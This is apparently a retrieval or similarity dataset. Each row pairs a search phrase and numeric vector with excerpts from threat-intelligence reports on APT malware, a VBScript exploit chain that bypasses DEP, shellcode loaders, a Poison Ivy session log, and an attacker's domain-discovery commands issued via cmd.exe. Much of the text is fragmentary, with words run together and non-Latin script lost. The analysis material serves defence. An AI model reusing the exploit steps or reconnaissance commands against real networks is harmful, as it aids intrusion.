hash|phrase|similarity|adjacent_sentences
2502996,22529708,3420840,18895089,8318133,7829423,4801307,1130271,5227323,144334,1538528,1340104,3183692,7058788,3883194,4605955,1311400,1320109,2277172,9119053,1549220,1780287,3873373,1465089,1547792,3834772,9823384,1304284,5739790,6468675,3866674,804298,546566,3345264,450747,4298650,3361707,524586,9976448,2472168,8218112,271487,318750,2489092,8636083,161877,154298,2891398,1768840,2414303,669973,1993635,2024043,682095,358757,557991,3093796,395549,11163758,29427,2470016,2652027,1793811,3549008,745699,2992721,3148072,4267729,1169998,5029475,86224,3270495,1187686,6787830,1476990,539955,7910718,196508,4681870,3407996,5100988,99339,6275812,15154920,13528728,4613699,5173307,2605334,134600,1647749,1357031,7561000,2854923,826274,3668424,5229812,5674697,282804,3522355,4576409,1512905,6629543,2119298,28107,2117733,916397,626106,1634069,5082373,6384293,2212147,630337,1957091,983972,1509448,2273975,221657,6834645,607263,989728,98344,82201,6464083,4241466,333147,895863,9442910,3188038|the decryption algorithm|0.7618543230074822|['If the input argument is addr(0x11223344), first add 4 to the value to get 0x11223348, and then set the variant type to 8 (string type).', 'Next, call len function: if found to be BSTR type, vbscript will assume that the forward 4 bytes (0x11223344) is the address memory to store the length.', 'So the len function will be executed and the value of the specified memory address will be returned.', 'Obtain Key DLL Base Address 1.', 'The attacker leaks the virtual function table address of the CScriptEntryPoint object in the following way, which belongs to Vbscript.dll.', '1.', 'Obtain the vbscript.dll base address in the following way.', '1.', 'Because vbscript.dll imported msvcrt.dll, the msvcrt.dll base address was obtained by traversing the vbscript.dll import table, msvcrt.dll introduces kernelbase.dll, ntdll.dll, and finally the NtContinue, VirtualProtect function address was obtained.', 'Save web pages as PDF with PDFmyURLBypass DEP to execute shellcode 1.', 'Use arbitrary reading and writing technique to modify the VAR type type to 0x4d, and then assign it with a value of 0 to make the virtual machine perform VAR:: Clear function.']
3749336,22529708,7034219,23371577,2187658,7829423,4801307,1130271,5227323,144334,1538528,3405293,3183692,7058788,16815787,4605955,3055130,1320109,2651234,11100931,1549220,1780287,3873373,22006391,1547792,3834772,8565033,2305085,5597635,6468675,3901026,804298,546566,3345264,450747,4298650,3361707,524586,9976448,2472168,8218112,8048436,6687197,2489092,14841929,161877,154298,3359461,7617318,2414303,669973,1993635,2024043,682095,358757,2573792,675540,395549,11163758,2362841,2470016,2652027,1345231,3549008,745699,2992721,3148072,4267729,1169998,5029475,86224,4126232,1187686,418002,1476990,539955,8172015,196508,4681870,3407996,5100988,99339,6275812,15154920,1808857,4613699,3161609,2605334,716800,1647749,1357031,7561000,10016507,826274,3668424,5229812,5674697,282804,3522355,5307336,2469418,6629543,376980,28107,2117733,1543963,751071,1634069,2659949,6384293,2212147,1192114,1957091,983972,1509448,746733,221657,6834645,3526366,989728,98344,82201,6464083,4241466,333147,895863,9442910,4773609|the decryption algorithm|0.791515393227727|['The set of Trojans is powerful, with keyboard recording, voice recording, screen capture, file capture and U disk operation functions, etc.', 'The Lucker s name comes from the PDB path of this type of Trojan, because most of the backdoors function use the LK abbreviation.In the middle to late period we have discovered its evolution and two different types of backdoor programs.', 'We have named them Retro and Collector by the PDB path extracted from the program.', 'The Retro backdoor is an evolution of the Lucker backdoor and it actives in a series of attacks from 2016 till now.', 'The name comes from the pdb path of this type of Trojan with the label Retro, and also has the word Retro in the initial installer.C:\\\\workspace\\\\Retro\\\\DLL-injected-explorer\\\\zlib1.pdbC:\\\\workspace\\\\Retro\\\\RetroDLL\\\\zlib1.pdbThe evolution of the reflective DLL injection technique can be found from the relevant PDB paths, and there are a lot of variants of this series of backdoors.VII Attribution1.', 'Decryption AlgorithmDuring the analysis, we found the decryption algorithm that malware used is identical to APT-C-06s decryption algorithm.The decryption algorithm of this attack is as follow:The decryption algorithm APT-C-06 used is as follow:In the further analysis, we found the same decryption algorithm was used in the 64-bit version of the relevant malware.2.', 'PDB PathThe PDB path of the malware used in this attack has a string of Retro.', 'It is one specific feature of Retro Trojan family.3.', 'VictimsIn the process of tracing victims, we found one special compromised machine.', 'It has a large amount of malware related to APT-C-06.', 'By looking at these samples in chronological order, the evolution of the malicious program can be clearly seen.']
1831264,2248874,3161816,450901,3453873,4879715,4555,900025,4306682,2311659,2982352,68463,2313338,1453262,323805,271858,190132,304913,566955,1379880,1887686,6729360,2951855,91174,1547792,451836,1324353,150572,1574672,2254684,3661179,804298,4252704,528225,1728845,2926056,1245632,904925,3926926,2472168,1555064,14261,1572129,1004199,5308609,136455,1483022,1300803,61146,842108,2018402,4965337,840559,4246671,358757,557991,3149179,1805072,239071,937238,1235269,1046121,171273,4076196,699456,95207,12232,313465,1169998,1594294,3837077,1921389,4760458,208276,191057,1684299,2024333,2798891,1008115,1081391,5100988,99339,1530477,8069977,5662685,193311,1942996,2738404,2396794,1450932,328965,1970731,1546072,4643738,4211804,5229812,1394683,192023,310578,1307595,2278521,630242,1158066,21659,40464,332526,626106,4132242,6950669,914881,5102088,1185416,541281,71,255017,1404663,3207842,4157342,483341,989728,2789300,736384,2152916,579733,333147,895072,3860344,1083979|to decrypt the payload|0.7732040203685518|"['The execution of StealthMutant through InstallUtil.exe InstallUtil.exe is a legitimate installer application under Microsofts .NET Framework, but it is also known as a living-off-the-land binary (LOLBin) that is used in the proxy execution of .NET Framework programs.', 'In a scheduled task, InstallUtil.exe is registered to run StealthMutant, as demonstrated in Figure 11.', 'Figure 11.', 'InstallUtil.exe being registered to run StealthMutant via a scheduled task 10 | Earth Baku: An APT Group Targeting Indo-Pacific Countries With New Stealth Loaders and BackdoorTechnical Analysis of the Loaders Earth Bakus new campaign takes advantage of the various capabilities of two shellcode loaders, StealthMutant and StealthVector.', 'StealthMutant StealthMutant is an evasive shellcode loader written in C# that has been in use since at least July 2020.', 'It reads a file that is encrypted by AES-256-ECB, decrypts the file in memory, injects its malicious payload into a remote process, and then executes it.', 'We have observed that its payload has been either the Cobalt Strike beacon or the ScrambleCross backdoor.', 'Most of the StealthMutant samples we have come across are obfuscated by ConfuserEx, an open-source obfuscator for .NET Framework applications.', 'After deobfuscating these samples, we have observed raw namespaces and classes that describe their purpose (Figure 12).', 'Figure 12.', 'The namespaces and classes from the deobfuscated samples 11 | Earth Baku: An APT Group Targeting Indo-Pacific Countries With New Stealth Loaders and BackdoorAll the strings in StealthMutant are encrypted with the encryption algorithm AES-256-ECB and are decrypted on the spot, as shown in Figure 13.']"
1831264,2248874,3161816,450901,3453873,4879715,4555,900025,4306682,2311659,2982352,68463,2313338,1453262,323805,271858,190132,304913,566955,1379880,1887686,6729360,2951855,91174,1547792,451836,1324353,150572,1574672,2254684,3661179,804298,4252704,528225,1728845,2926056,1245632,904925,3926926,2472168,1555064,14261,1572129,1004199,5308609,136455,1483022,1300803,61146,842108,2018402,4965337,840559,4246671,358757,557991,3149179,1805072,239071,937238,1235269,1046121,171273,4076196,699456,95207,12232,313465,1169998,1594294,3837077,1921389,4760458,208276,191057,1684299,2024333,2798891,1008115,1081391,5100988,99339,1530477,8069977,5662685,193311,1942996,2738404,2396794,1450932,328965,1970731,1546072,4643738,4211804,5229812,1394683,192023,310578,1307595,2278521,630242,1158066,21659,40464,332526,626106,4132242,6950669,914881,5102088,1185416,541281,71,255017,1404663,3207842,4157342,483341,989728,2789300,736384,2152916,579733,333147,895072,3860344,1083979|decrypt it|0.9024083156629212|"['The execution of StealthMutant through InstallUtil.exe InstallUtil.exe is a legitimate installer application under Microsofts .NET Framework, but it is also known as a living-off-the-land binary (LOLBin) that is used in the proxy execution of .NET Framework programs.', 'In a scheduled task, InstallUtil.exe is registered to run StealthMutant, as demonstrated in Figure 11.', 'Figure 11.', 'InstallUtil.exe being registered to run StealthMutant via a scheduled task 10 | Earth Baku: An APT Group Targeting Indo-Pacific Countries With New Stealth Loaders and BackdoorTechnical Analysis of the Loaders Earth Bakus new campaign takes advantage of the various capabilities of two shellcode loaders, StealthMutant and StealthVector.', 'StealthMutant StealthMutant is an evasive shellcode loader written in C# that has been in use since at least July 2020.', 'It reads a file that is encrypted by AES-256-ECB, decrypts the file in memory, injects its malicious payload into a remote process, and then executes it.', 'We have observed that its payload has been either the Cobalt Strike beacon or the ScrambleCross backdoor.', 'Most of the StealthMutant samples we have come across are obfuscated by ConfuserEx, an open-source obfuscator for .NET Framework applications.', 'After deobfuscating these samples, we have observed raw namespaces and classes that describe their purpose (Figure 12).', 'Figure 12.', 'The namespaces and classes from the deobfuscated samples 11 | Earth Baku: An APT Group Targeting Indo-Pacific Countries With New Stealth Loaders and BackdoorAll the strings in StealthMutant are encrypted with the encryption algorithm AES-256-ECB and are decrypted on the spot, as shown in Figure 13.']"
2580654,3481342,154190,453750,1246945,7681486,4555,1986984,3245573,11051094,1538528,2961598,75637,991010,3422199,943771,2669182,304913,1413560,9119053,4821979,3905476,6004378,5971639,3474163,3082562,1448722,1304284,4139590,768901,2266808,804298,546566,528225,450747,1552346,1245632,904925,1245274,1795159,43748,447996,270712,3429201,1297375,5564078,99708,1300803,61146,362282,669973,3668279,1878297,1847315,944721,557991,3877784,251887,4241899,2221128,1235269,242226,5348955,1458003,745699,6446627,4557581,155833,1169998,1346686,86224,605505,211024,274259,1908807,539955,2101438,1335849,1351311,1081391,2689271,99339,1120607,649669,604504,8072599,3118406,580705,873149,755858,974757,2933573,2228093,4144297,994006,693543,823787,3131165,310578,1307595,4168651,2243871,2255866,28107,47270,1543963,626106,802199,2583523,3674981,2743013,880597,1250663,2523889,1509448,226901,178743,4157342,694672,989728,1123634,2485405,362211,821576,259712,895072,173354,820365|API obfuscation, and execution flow obfuscation|0.7884577806423791|['ESET Research White papers // July 2019 MACHETE JUST GOT SHARPER Venezuelan military under attack How spies managed to steal gigabytes of confidential data over the course of a yearTABLE OF CONTENTS 1.', 'Introduction .', '.', '.', '.', '.', '.', '.']
924597,3133843,761466,450901,1259187,5205048,4801307,2963064,1928603,210700,2771361,343617,1954083,991010,1886773,271858,4838741,272952,2265669,789130,540931,3251328,311967,102327,1184486,451836,1271261,775463,760948,1390488,3461066,64500,95329,446193,647128,1446146,539112,2362921,132693,445374,1207572,14261,579674,1004199,2150688,161877,293546,531650,887594,111080,1381143,1398878,840559,2972499,115547,686575,1288950,500064,1923531,1599294,271752,539804,1273891,1151252,745699,1434057,12232,313465,735142,576126,138428,221891,42564,738242,3968109,530850,687837,1937790,76950,2650281,1842598,99339,1743522,1890201,203993,2319043,317595,586385,2301376,1450932,1357031,435639,1698259,1827306,1342943,927937,615673,2510940,3814559,3336864,13217,630242,5090188,28107,40464,1543963,1030147,3070446,263027,914881,11344,1012132,72167,2387170,64547,226901,221657,1529333,1536601,989728,1020253,82201,2443581,821576,333147,1528994,1541699,410329|proxy|0.7552352780652003|['Securelist.', 'August 2015. can even be such a thing.', 'In a hypothetical scenario where we https://securelist.com/blog/research/71713/darkhotels- have packets captured en route (as in the common jab PCAP or attacks-in-2015/.', 'GTFO), could it not be a backdoored system being used to [2] Schneier, B.', 'Simultaneous Discovery of Vulnerabilities.', 'proxy through?', 'Where we catch a nation-state operator Schneier on Security.', 'February 2016. red-handed, would we not need an understanding of the https://www.schneier.com/blog/archives/2016/02/ provenance of their tasking?', 'More realistically, there will never simultaneous_di.html.', 'be a solid enough attribution claim for everyone to get behind.', 'Rather, the combination of multiple indicators helps an analyst [3] Equation Group: Questions and Answers.']
3749336,3133843,3161816,1247727,9975463,3091719,4801307,2122315,3078089,1064987,1538528,1616244,3158055,2359709,175535,4605955,3055130,1320109,977913,477735,1318600,1427254,134497,1914113,1869668,6013240,1324353,1978584,998259,6555506,285983,804298,2772306,535798,450747,1761342,1245632,4802295,7897002,2041198,3597062,156065,1149528,1120881,3168497,8935,140586,1300803,61146,950965,2018402,1280595,2283022,2867811,358757,557991,451204,6044690,3910673,1151625,1235269,6218200,171273,2685657,3025614,2277639,3148072,5224622,308880,193085,2314725,1271278,1721996,1839938,7364838,539955,2101438,2772292,1008115,1081391,1034063,99339,1530477,281226,1207127,4613699,2982792,42897,137354,6679899,8672741,2933573,1544905,5149875,315309,693543,2780391,2016755,3278246,1307595,236891,2200313,7984118,1199104,828264,1543963,1030147,1634069,724147,1395271,691032,880597,852580,2387170,3662869,162911,3825597,4263372,483341,989728,1431689,736384,688858,3030832,333147,360512,4450784,2918218|Windows API|0.7903233347120202|['ESET Research Whitepapers // August 2018 TURL A OUTLOOK BACKDOOR Analysis of an unusual Turla backdoor2 Turla Outlook Backdoor // Analysis of an unusual Turla backdoor 1.', 'CONTENTS 1.', 'Introduction.', '.', '.', '.', '.', '.', '.']
1205313,2628796,127647,4126378,2003845,5903469,4555,1328627,2277640,1688396,377292,1150164,1036143,2286612,6211419,271858,1578989,1441989,1389501,4975147,938743,4980587,134497,179041,1651282,3863672,2071235,93063,1907116,501391,138994,804298,2506880,8417,332821,2812502,1825928,544315,1864699,1417176,2382169,4481724,1212621,1189780,504036,1113410,8168631,4873149,137340,2517325,1697608,126970,2922640,4484306,2264978,400408,2026274,667231,1600876,607008,13854,1459474,4338506,2412112,1432060,2743585,257893,990284,2161459,210855,1877858,612677,3563285,234583,917672,989713,401566,2681483,437619,280313,1139850,1148231,927977,1361865,221147,352726,242601,10460764,469670,1380281,1830008,517294,4883,1334163,112742,872512,1045640,1540475,168149,851121,1146043,822031,489932,818151,413276,79323,1953177,527753,569677,448529,1339358,1731902,1956960,1884987,1083502,6153092,953177,778682,247588,738581,805691,514549,1267718,1745964,333147,3815719,3693947,104285|Windows API|0.7903233347120202|"[': //http://localhost:3699/api/GetSources?Type=3&start=1532620329&end=1532620329 : [ { ""Type"": 3, ""IP"": """", 23""Mac"": """", ""Name"": "" Scotland Redmoss 1,9km"", ""StationNumber"": """", ""Time"": 1532563200000, ""GeoX"": 57.13, ""GeoY"": -2.12, ""Extras"": ""Vsat  "" }, { ""Type"": 3, ""IP"": """", ""Mac"": """", ""Name"": ""iDirect HUB iNFINITI"", ""StationNumber"": """", ""Time"": 1538572327000, ""GeoX"": 55.784,""GeoY"": 37.486, ""Extras"": ""-NSS 7; -Ku-3 Norsat; -Vertical; -12558014279; vsat_-iDirect HUB iNFINITI; _-1538572327; - 55,784|37,486; - Moscow Oblast Khoroshevo-Mnevniki (159000) 0,9km"" }, ... ]     1.     : {ip}:9850/api/GetState : [ { ""Id"": 1, ""Name"": """", ""Status"": ""Ok"", ""Message"": "" .', ': 478"" },... ]    1.      id  : {ip}:9850/api/KeyWords/{id} //GET : id   .', ': //http://localhost:3699/api/KeyWords/1 [ { ""ID"": 1, ""Language"": ""AR"", ""KeyWords"": [""*"",""Sergy*"",""356"",""Test rub 358999"",""Last Add rub 66""] }, 24{ ""ID"": 1, ""Language"": ""CA"", ""KeyWords"": [""ARRAMBADA"",""BANDARRA"",""BARRINAR"",""BOLLERA"",""BOLLICAO"",""CAGANER"", ""CARDAR"",""CASCAR&SE&LA"",""COLLONS"",""CONSOLADOR"",""CONY"",""CUL"",""ESCALFAPOLLES"",""FAR RANACO"",""FER&UN&RIU"", ""FIGA"",""FILL&DE&PUTA"",""FILL&DE&VERRA"",""FOLLADOR"",""FOLLAR"",""FURNICAR"",""GALLUMBOS"","" GILIPOLLES"",""HINYAR "",""LLEPAR"",""LLETERADA"",""MAMADA"",""MANOLA"",""MARIETA"",""MARIPILI"",""PAJARITO"",""PARRS"",""P ELAR&SE&LA"",""PUT A"",""PUTOT"",""TREMPERA"",""TXITX*"",""XONA"",""XUFA""] }, { ""ID"": 1, ""Language"": ""CS"", ""KeyWords"": [""BUZERANT"",""CHUJ"",""HOVNO"",""KOULE"",""KUNDA"",""KURVA"",""PRDEL"",""VEJCE"",""ZMRD""] },... ] 2.      id .', 'POST.', ': { ""ID"": 1, ""Language"": ""AR"", ""KeyWords"": [ ""*"", ""Sergy*"", ""356"", ""Test rub 358999"", ""Last Add rub 667"" ] }     1.    : {ip}:9850/api/rubriclist?Parent=-1 //    {ip}:9850/api/rubriclist?Parent=20 //    Parent=20 : [ { ""ID"": 0, ""ID1"": 0, ""Parent"": null, ""Name"": ""Uknown"" }, { ""ID"": 1, ""ID1"": 1, ""Parent"": 0, ""Name"": ""Garbage"" 25},... ] :  Url=""/json/rubrics/5 2.    : {ip}:9850/api/rubriclist api/LanguageList : [ { ""ID"": 0, ""ID1"": 0, ""ShortName"": ""UN"", ""Name"": ""UN-Unknown"" }, { ""ID"": 1, ""ID1"": 1, ""ShortName"": ""AA"", ""Name"": ""AA-Afar"" }, { ""ID"": 2, ""ID1"": 2, ""ShortName"": ""AB"", ""Name"": ""AB-Abkhazian"" },... ]  API          .', '.', ',          .', '.', '-       .', '26           -         ,       (),   (),     ().', '-   .']"
1408277,1934282,1017079,450901,904197,317247,494452,527077,2916588,1090695,939089,1616244,385616,4774759,745238,4605955,1851162,304913,2376874,550045,1549220,295108,2501536,6185677,3474163,451836,1156155,4086075,760948,31834,3285437,1002302,95329,528225,1426418,3749181,1590338,185762,172693,5025457,4334346,447996,1640568,1120881,2150688,3436746,140586,1112268,108256,2256748,2018402,649515,701711,8299052,115547,557991,2660171,6044690,1031629,1072244,1235269,2397494,1273891,2685657,119783,8451394,12232,1558710,1169998,193085,118342,917083,1721996,692807,2303342,539955,263054,2747802,1008115,1081391,2625023,629887,950888,5203542,1730905,327671,1935196,586385,6061460,1450932,328965,435639,583560,5149875,315309,5229812,2837940,4621695,1149633,1307595,1489800,2200313,5218095,28107,2073693,666370,700933,99727,5082373,914881,2212147,1061732,1153379,983972,2050408,1290753,3207842,646849,3881192,7393291,4490517,683488,1978795,1245527,333147,895072,6416480,4334444|Windows API|0.7903233347120202|['19 Corelan Team.', 'Starting to write Immunity Debugger PyCommands : my cheatsheet.', 'January 2010.', '10 www.fireeye.comPoison Ivy: Assessing Damage and Extracting Intelligence Defenders View Attackers View Starting ChopShop Initializing Modules ... Initializing module poisonivy_23x Transferred files will be saved.. Screen/Cam/Audio/Key captures will be saved.. Running Modules ... [2013-07-03 06:46:29 PDT] Poison Ivy Version:2.32 [2013-07-03 06:46:30 PDT]*** Host Information*** PI profile ID: mal IP address: 192.168.0.12 Hostname: BLUE Windows User: admin Windows Version: Windows XP Windows Build: 2600 Service Pack: Service Pack 3 [2013-07-03 06:46:36 PDT] *** Shell Session *** Microsoft Windows XP [Version 5.1.2600] (C) Copyright 1985-2001 Microsoft Corp. C:\\\\> [2013-07-03 06:46:42 PDT] *** Shell Session *** ipconfig [2013-07-03 06:46:43 PDT] *** Shell Session *** Windows IP Configuration Connection-specific DNS Suffix .', ': IP Address.', '.', '.', '.', '.', '.', '.']
6487092,10679223,11270859,4996716,6422018,3313211,3992849,231312,8311970,640873,3134393,3736017,3774543,22650610,1976064,3614028,7566764,4000947,9358448,8500794,2932714,3157805,2951855,1569267,123162,5514417,653375,973975,80056,560367,3843477,804298,19629754,14442742,10153581,10581508,425006,786142,1723191,11339629,2748654,2595712,3578130,4622356,7832907,4426443,3633323,6255746,3953480,3808922,19863576,7878182,1782368,2449514,5060718,11357955,1770718,2444044,338194,17561665,1334593,14007914,8790298,31120151,15066123,3025552,2129682,7873233,390763,11128502,6104151,643951,5792723,8677195,191057,674869,4494529,1000862,4308232,6118,7083512,13696965,1688092,4248119,128599,3830992,6516678,5530860,2629042,7108007,8202818,6372334,844584,1170104,14127787,3626048,3142117,321393,5946974,3535462,19674624,8268371,19756625,1199104,1541253,606400,3504879,3257090,27589208,7227058,163129,5156739,62820,3422161,25890129,6163797,9187719,1182033,1943242,2322760,2789300,9222362,10764370,6766883,333147,8184780,1174032,4965828|Windows API|0.7903233347120202|['1.RedEyes(also known as APT37, ScarCruft, Reaper)     APT     ,  ,       .', '.', 'ASEC(AhnLab Security Emergengy response Center) 2023 5 RedEyes  Ably   Golang                 .', '*ABLY[1]        Pub/Sub ,  ,  ,     .', 'Ably   Golang   ,    API   Github  .', 'API               .', '.ASEC    2023 5 RedEyes          ,          TTPs(Tactics, Techniques, and Procedures)  .2.2.1.']
2680518,651610,3084460,984460,2049164,483514,4555,1234171,487509,1816085,505130,1170561,217070,2286612,492091,2109561,1847006,40860,1016258,1790138,1009184,2040703,1611909,2037959,1231017,47442,3048652,321192,1633432,501391,670902,322877,169664,683840,1417254,1013312,151512,398824,490467,3056964,409199,4481724,1223536,2211224,1101524,2059769,1272754,139257,735975,104738,269579,9822,344909,592389,1646724,557991,259355,73112,589136,1072244,682443,1890947,2644140,429389,2940045,251505,840075,156889,186060,1380625,2199778,260099,1006032,659727,275740,102210,192943,2450877,456615,1207681,2957480,848601,1505480,328492,794782,2804584,301210,5350297,24933,2497436,1412143,1244586,4883,2563028,315309,1632788,1073040,520721,168149,193765,346761,1746134,276700,818151,1986886,693167,219485,1382286,979947,1023917,1984453,326383,1142502,2361924,2248791,172875,638410,216639,35307,73591,164396,1975906,90216,126742,333147,570235,1731439,3925298|Windows API|0.7903233347120202|['DLL- 2.', '.dat (SbieDll.dll / SbieMsg.dll) 3.', '.dat  DLL 4.', 'MemLoadLibrary 5.', '9002 RATDeed RATMITREIOCs    2019      Positive Technologies (PT Expert Security Center, PT ESC)   ,      -  .', '.', '2020           .', ',    ,           .', '2021 PT Expert Security Center    .', '.', '.']
7896647,12230542,7034219,6281469,3453873,4548638,3533828,1780407,1503609,525118,1538528,3405293,1358425,2665587,8814312,1819082,1047521,1320109,5312691,477735,1628894,8185191,5325355,3378470,4836413,1778695,2951290,8874972,5869345,4997447,1636139,804298,819303,985295,4399676,12036926,3361707,90525,3585627,959579,11142073,4606420,1572129,10421108,5841149,4543934,897695,3228334,3178035,6565113,114528,3770980,3464968,4201992,18496118,8447991,1871567,55751,4777518,10290845,1235269,6943016,933111,1718747,3850088,6026267,7297022,403912,1169998,3701269,86224,6038789,872900,1575153,20588532,10901896,10755919,27254469,192439,1081391,5100988,99339,9251187,5951189,4293020,7817624,6180455,1140734,3377300,1450932,1922798,6854167,1687682,2431243,2175422,5129446,1073040,13707840,8486820,1238214,2588426,2448746,21893811,2653176,13488373,981847,3140291,493416,8819485,3674981,2006049,1192114,1153379,7233443,1509448,2273975,2473484,2194538,2328811,1957897,893867,4416646,7919817,661534,5101138,10709439,4959204,2074485|C:\Windows\System32\cmd.exe /c|0.7619432530726247|"['Memory segments can be seen allocated with Execute, Read, and Write permissions, indicating that executable code is stored.Anomalous parent and child process relationships can be seen on the system that Hancitor was executed on, including rundll32.exe spawning svchost.exe and svchost.exe spawning cmd.exe.Moreover, the Cobalt Strike DLL stager was executed with a specific command line parameter which is used as a sandbox evasion feature.', 'In this case it is the number 11985756.Lastly, a PowerShell loader named agent1.ps1 used heavy obfuscation to conceal the execution flow and hide the final shellcode.', 'After many iterations, the script would deobfuscate and run-in memory.', 'The shellcode is responsible for loading a PE file into memory and calling out to 64.235.39[.', ']32 for further instructions.Credential AccessThe only credential access observed was through Zerologon, which was used to retrieve the domain administrators NTLM hash.DiscoveryDiscovery started with a port scan initiated by the Hancitor dll.After SMB was scanned we saw scans of 5000/tcp, 9392/tcp, 6106/tcp.', 'The threat actors were scanning for backup products such as Synology, Backup Exec and Veeam.This was followed by a battery of discovery command using the built in Microsoft utilities to discover domain controllers, administrators, connectivity checks and other items.C:\\\\Windows\\\\system32\\\\cmd.exe /C net time   C:\\\\Windows\\\\system32\\\\cmd.exe /C ping [Domain Controller]   C:\\\\Windows\\\\system32\\\\cmd.exe /C nltest /dclist:[Domain Name]   C:\\\\Windows\\\\system32\\\\cmd.exe /C Net group""Domain Admins""/domain \\\\  C:\\\\Windows\\\\system32\\\\cmd.exe /C nslookup   C:\\\\Windows\\\\system32\\\\cmd.exe /C ping190.114.254.116C:\\\\Windows\\\\system32\\\\cmd.exe /C net group /domainNotice above, the threat actors pinged 190.114.254[.', ']116 which is one of the Cobalt Strike servers they later used.The threat actors enumerated local administrative access on remote systems by checking access to the C$ share for hosts discovered after the port scan.We observed a PowerShell script named comp2.ps1 that was executed on every Domain Controller in the environment.', 'This script used the Active Directory RSAT module to get a list of computers and place them in a file named comps.txt.A program named check.exe was observed using the comps.txt text file.', 'This program will take a list of IP addresses and hostnames from comps.txt and check if they are online using ICMP.', 'The online hosts will then be directed to the check.txt text file.The check.exe file contains three parameters that can be used one at a time:check.exe comps.txtcheck.txt -ip (Checkwhichhostsincomps.txtarealive,andwrite the IPtocheck.txt)check.exe comps.txtcheck.txt -name(Checkwhichhostsincomps.txtarealive,andwrite the hostnametocheck.txt)check.exe comps.txtcheck.txt -full(Checkwhichhostsincomps.txtarealive,andwrite the IPandhostnametocheck.txt)Lateral MovementThe threat actors pivoted towards multiple hosts on the domain from the beachhead.', 'The main actions involved copying a Cobalt Strike DLL beacon and a batch script to run the DLL (cor.dll, cor.bat, GAS.dll, GAS.bat).']"
